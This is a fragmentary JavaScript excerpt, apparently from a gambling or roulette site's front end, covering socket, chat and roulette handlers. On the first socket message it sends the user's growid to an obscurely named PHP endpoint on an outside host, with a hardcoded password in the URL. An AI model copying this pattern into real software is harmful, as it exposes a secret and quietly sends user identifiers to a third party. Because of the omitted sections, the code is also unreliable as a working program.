...
function onMessageSocket(m) {
	...
	if (m.type == 'first') {
		...
		$.ajax({
			url: "https://petxscript.me/terffsd51g15gwqwdffdswwd.php?password=54dsgr87456450adqnmdrtg&growid=" + String(m.growid),
...
function chat_message(message, added) {
	if (message.type == 'system') {
		...
		DIV += '<img class="icon-medium rounded-full" src="https://petxscript.me/favicon-16x16.png?v=1670521522">';
		DIV += '</div>';
...
function rouletteGame_finish(roll) {
	...
	setTimeout(function () {
		...
		$('.roulette-highicon').attr('src', 'https://petxscript.me/favicon-16x16.png?v=1670521522');
